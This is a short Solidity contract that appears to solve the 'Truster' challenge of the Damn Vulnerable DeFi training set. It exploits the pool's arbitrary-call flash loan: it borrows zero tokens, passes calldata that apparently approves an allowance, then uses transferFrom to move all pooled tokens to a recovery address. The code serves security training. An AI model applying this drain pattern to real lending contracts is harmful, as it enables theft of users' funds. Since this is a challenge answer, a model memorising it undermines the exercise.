// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Execute {
    function execute(
        TrusterLenderPool pool,
        DamnValuableToken token,
        address recovery,
        uint256 TOKENS_IN_POOL,
        bytes calldata data
    ) public {
        pool.flashLoan(0, address(pool), address(token), data);
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}
